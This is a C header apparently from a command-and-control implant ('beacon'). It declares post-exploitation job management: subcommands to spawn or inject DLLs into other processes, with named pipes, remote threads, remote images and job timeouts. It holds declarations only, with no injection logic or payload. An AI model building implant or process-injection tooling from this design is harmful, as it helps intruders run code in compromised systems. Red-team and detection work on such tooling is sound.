#pragma once

#include "beacon_common.h"
#include "beacon_packet.h"

struct BeaconContext;

#define POSTEX_SUBCMD_SPAWN_DLL     5u
#define POSTEX_SUBCMD_INJECT_DLL    6u

#define POSTEX_EVENT_OUTPUT 2u
#define POSTEX_EVENT_DEAD   3u
#define POSTEX_EVENT_FRAME  4u

#define POSTEX_MAX_JOBS 32u

typedef struct PostExJob {
    UINT32 job_id;
    UINT32 subcmd;
    DWORD pid;
    HANDLE pipe;
    HANDLE process;
    HANDLE remote_thread;
    BOOL owns_process;
    UINT32 backend_kind;
    PVOID remote_image;
    PVOID remote_config;
    CHAR pipe_name[128];
    CHAR description[64];
    ULONGLONG started_at;
    ULONGLONG started_tick;
    ULONGLONG last_activity_tick;
    ULONGLONG cancel_requested_tick;
    UINT32 max_runtime_ms;
    UINT32 idle_timeout_ms;
    UINT32 cancel_reason;
    BOOL cancel_requested;
    struct PostExJob* next;
} PostExJob;

typedef struct PostExManager {
    CRITICAL_SECTION lock;
    PostExJob* jobs;
    struct BeaconContext* ctx;
} PostExManager;

VOID PostExInit(PostExManager* pm, struct BeaconContext* ctx);
VOID PostExFree(PostExManager* pm);

ByteBuf PostExHandle(struct BeaconContext* ctx, UINT32 task_id, Parser* parser);
BOOL PostExCancelJob(struct BeaconContext* ctx, UINT32 job_id, ByteBuf* out);
VOID PostExAppendJobs(PostExManager* pm, ByteBuf* out, SIZE_T* count, ULONGLONG now);
PacketList PostExPoll(PostExManager* pm);
